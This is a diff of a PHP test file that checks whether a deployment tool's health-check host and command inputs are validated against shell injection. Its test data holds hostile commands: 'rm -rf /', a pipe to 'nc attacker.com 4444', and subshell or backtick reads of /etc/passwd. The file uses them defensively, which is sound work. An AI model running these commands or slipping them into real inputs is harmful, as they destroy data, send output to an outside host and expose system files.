@@ -1,10 +1,14 @@
 <?php
 
 use App\Jobs\ApplicationDeploymentJob;
+use App\Livewire\Project\Shared\HealthChecks;
 use App\Models\Application;
 use App\Models\ApplicationDeploymentQueue;
 use App\Models\ApplicationSetting;
 use Illuminate\Support\Facades\Validator;
+use Tests\TestCase;
+
+uses(TestCase::class);
 
 beforeEach(function () {
     Mockery::close();
@@ -85,6 +89,56 @@ it('uses escapeshellarg on the constructed URL', function () {
     // escapeshellarg wraps in single quotes
     expect($result)->toContain("'http://my-app.local:80/api/health'");
 });
+
+it('builds the healthcheck URL with brackets for an IPv6 host', function (string $host, string $expectedUrl) {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_host' => $host,
+        'health_check_port' => '8080',
+        'health_check_path' => '/health',
+    ]);
+
+    expect($result)->toContain("'{$expectedUrl}'")
+        ->and($result)->not->toContain('localhost');
+})->with([
+    'loopback' => ['::1', 'http://[::1]:8080/health'],
+    'bracketed loopback' => ['[::1]', 'http://[::1]:8080/health'],
+    'global address' => ['2A01:4F8:0::1', 'http://[2a01:4f8::1]:8080/health'],
+]);
+
+it('falls back to localhost for an invalid IPv6-like healthcheck host', function (string $host) {
+    $result = callGenerateHealthcheckCommands(['health_check_host' => $host]);
+
+    expect($result)->toContain("'http://localhost:80/'");
+})->with([
+    'too many colons' => [':::1'],
+    'shell injection in brackets' => ['[::1];id'],
+    'unclosed bracket' => ['[::1'],
+]);
+
+it('keeps IPv4 and hostname healthcheck hosts unchanged', function (string $host) {
+    $result = callGenerateHealthcheckCommands(['health_check_host' => $host, 'health_check_port' => '3000']);
+
+    expect($result)->toContain("'http://{$host}:3000/'");
+})->with(['localhost', '127.0.0.1', 'my-app.local']);
+
+it('validates the health check host in the health checks form', function (string $host, bool $passes) {
+    $rules = (new ReflectionMethod(HealthChecks::class, 'rules'))->invoke(new HealthChecks);
+
+    $validator = Validator::make(['healthCheckHost' => $host], ['healthCheckHost' => $rules['healthCheckHost']]);
+
+    expect($validator->passes())->toBe($passes);
+})->with([
+    'localhost' => ['localhost', true],
+    'hostname' => ['my-app.local', true],
+    'IPv4' => ['127.0.0.1', true],
+    'IPv6 loopback' => ['::1', true],
+    'bracketed IPv6 loopback' => ['[::1]', true],
+    'IPv6 address' => ['2a01:4f8::1', true],
+    'invalid IPv6' => [':::1', false],
+    'unclosed bracket' => ['[::1', false],
+    'shell metacharacters' => ['localhost; id #', false],
+    'IPv6 with shell metacharacters' => ['[::1];id', false],
+]);
 
 it('validates health_check_host rejects shell metacharacters via API rules', function () {
     $rules = sharedDataApplications();
@@ -176,11 +230,11 @@ it('generates CMD healthcheck command directly', function () {
 it('strips newlines from CMD healthcheck command', function () {
     $result = callGenerateHealthcheckCommands([
         'health_check_type' => 'cmd',
-        'health_check_command' => "redis-cli ping\n&& echo pwned",
+        'health_check_command' => "redis-cli\nping",
     ]);
 
     expect($result)->not->toContain("\n")
-        ->and($result)->toBe('redis-cli ping && echo pwned');
+        ->and($result)->toBe('redis-cli ping');
 });
 
 it('falls back to HTTP healthcheck when CMD type has empty command', function () {
@@ -193,30 +247,66 @@ it('falls back to HTTP healthcheck when CMD type has empty command', function ()
     expect($result)->toContain('curl -s -X');
 });
 
-it('validates healthCheckCommand rejects strings over 1000 characters', function () {
-    $rules = [
-        'healthCheckCommand' => 'nullable|string|max:1000',
-    ];
+it('falls back to HTTP healthcheck when CMD command contains shell metacharacters', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl localhost; rm -rf /',
+    ]);
 
-    $validator = Validator::make(
-        ['healthCheckCommand' => str_repeat('a', 1001)],
-        $rules
-    );
-
-    expect($validator->fails())->toBeTrue();
+    // Semicolons are blocked by runtime regex — falls back to HTTP healthcheck
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('rm -rf');
 });
 
-it('validates healthCheckCommand accepts strings under 1000 characters', function () {
-    $rules = [
-        'healthCheckCommand' => 'nullable|string|max:1000',
-    ];
+it('falls back to HTTP healthcheck when CMD command contains pipe operator', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'echo test | nc attacker.com 4444',
+    ]);
 
-    $validator = Validator::make(
-        ['healthCheckCommand' => 'pg_isready -U postgres'],
-        $rules
-    );
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('nc attacker.com');
+});
 
-    expect($validator->fails())->toBeFalse();
+it('falls back to HTTP healthcheck when CMD command contains subshell', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl $(cat /etc/passwd)',
+    ]);
+
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('/etc/passwd');
+});
+
+it('falls back to HTTP healthcheck when CMD command exceeds 1000 characters', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => str_repeat('a', 1001),
+    ]);
+
+    // Exceeds max length — falls back to HTTP healthcheck
+    expect($result)->toContain('curl -s -X');
+});
+
+it('falls back to HTTP healthcheck when CMD command contains backticks', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl `cat /etc/passwd`',
+    ]);
+
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('/etc/passwd');
+});
+
+it('uses sanitized method in full_healthcheck_url display', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_method' => 'INVALID;evil',
+        'health_check_host' => 'localhost',
+    ]);
+
+    // Method should be sanitized to 'GET' (default) in both command and display
+    expect($result)->toContain("'GET'")
+        ->and($result)->not->toContain('evil');
 });
 
 /**
@@ -253,14 +343,19 @@ function callGenerateHealthcheckCommands(array $overrides = []): string
     $application->shouldReceive('getAttribute')->with('settings')->andReturn($settings);
 
     $deploymentQueue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
+    $deploymentQueue->shouldReceive('addLogEntry')->andReturnNull();
 
     $job = Mockery::mock(ApplicationDeploymentJob::class)->makePartial();
 
-    $reflection = new ReflectionClass($job);
+    $reflection = new ReflectionClass(ApplicationDeploymentJob::class);
 
     $appProp = $reflection->getProperty('application');
     $appProp->setAccessible(true);
     $appProp->setValue($job, $application);
+
+    $queueProp = $reflection->getProperty('application_deployment_queue');
+    $queueProp->setAccessible(true);
+    $queueProp->setValue($job, $deploymentQueue);
 
     $method = $reflection->getMethod('generate_healthcheck_commands');
     $method->setAccessible(true);
